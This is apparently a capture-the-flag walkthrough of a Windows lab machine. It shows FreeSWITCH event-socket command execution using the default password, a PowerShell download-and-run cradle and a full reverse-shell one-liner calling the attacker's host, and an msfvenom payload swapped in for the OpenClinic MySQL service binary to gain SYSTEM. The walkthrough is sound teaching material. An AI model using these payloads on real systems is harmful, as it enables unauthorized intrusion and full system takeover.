# Enumeration
```bash
Nmap scan report for 10.10.17.103
Host is up (0.18s latency).

PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-28T10:49:22+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
|_ssl-date: 2022-02-28T10:49:23+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Looking at the results, we have port 3389(RDP) and port 8021 running `Freeswitch`.

FreeSWITCH is a free, open-source communications server software supporting VoIP, Video chat, Text chat, and even screen sharing across multiple platforms.
Looking for public exploit for this
```bash
$ searchsploit freeswitch
FreeSWITCH - Event Socket Command Execution (Metasploit)
FreeSWITCH 1.10.1 - Command Execution 
```

# Exploitation
Looking at the exploit, the exploit takes _CMD_ and _ADDRESS_ from user. Then create a socket to the address and port. It uses default password to authenticate
and use `api system` to run the commands
```python
PASSWORD='ClueCon' # default password for FreeSWITCH
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
```
Following the steps, we have RCE on the box.
```bash
nc -nvv 10.10.53.47 8021                                                   1 ⨯
(UNKNOWN) [10.10.53.47] 8021 (zope-ftp) open
Content-Type: auth/request
auth ClueCon

Content-Type: command/reply
Reply-Text: +OK accepted

api system "whoami"
Content-Type: api/response
Content-Length: 25
win-eom4pk0578n\nekrotic

# To get reverse shell
api system "powershell.exe IEX (new-object net.webclient).downloadstring('http://10.17.1.113:8080/rev.ps1')"
```
Looking at our `rev.ps1`
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.17.1.113",9991);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Enumerating a bit, looking at other users and process, we found
```powershell
PS C:\> whoami
win-eom4pk0578n\nekrotic

PS C:\> net user 

User accounts for \\WIN-EOM4PK0578N

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Nekrotic                 WDAGUtilityAccount    

PS C:\> net user nekrotic
User name                    Nekrotic
Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 

PS C:\> tasklist /svc                                                                                                                                                                                                                                                                                                                          
Image Name                     PID Services                                                                                                                              
========================= ======== ============================================     
svchost.exe                   1288 DiagTrack                                    
mysqld.exe                    1464 OpenClinicMySQL                              
tomcat8.exe                    784 OpenClinicHttp                               
svchost.exe                   2060 W32Time         
...[snip]...
```
# Privilege Escalation
With a little enumeration, we find there is a projects folder in the C drive. The projects folder contains another one called "openclinic". Looking at public
exploit for the application, we found the [exploit](https://www.exploit-db.com/exploits/50448)

> A low privilege account is able to rename mysqld.exe or tomcat8.exe files located in bin folders and replace  with a malicious file that would connect back to an attacking computer giving system level privileges  (nt authority\system) due to the service running as Local System.

Following the steps, we create a malicious exe using _msfvenom_. 
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.1.113 LPORT=4000 -f exe > evil.exe
```
We can now transfer the exe to victim machine, and rename the file.
```powershell
PS C:\projects\openclinic\mariadb\bin> rename-item mysqld.exe -newname mysqld.bak
PS C:\projects\openclinic\mariadb\bin> rename-item evil.exe -newname mysqld.exe
PS C:\projects\openclinic\mariadb\bin> shutdown /r now
```
Setup a listner, and we have the root shell
```powershell
nc -lvnp 4000                                                                                                                                                       
listening on [any] 4000 ...                                                                                                                                              
connect to [10.17.1.113] from (UNKNOWN) [10.10.53.47] 49670                                                                                                              
Microsoft Windows [Version 10.0.17763.737]                                                                                                                               
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                     
                                                                                                                                                                         
C:\Windows\system32>whoami                                                                                                                                               
whoami                                                                                                                                                                   
nt authority\system     

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,508,554,240 bytes free

C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
```
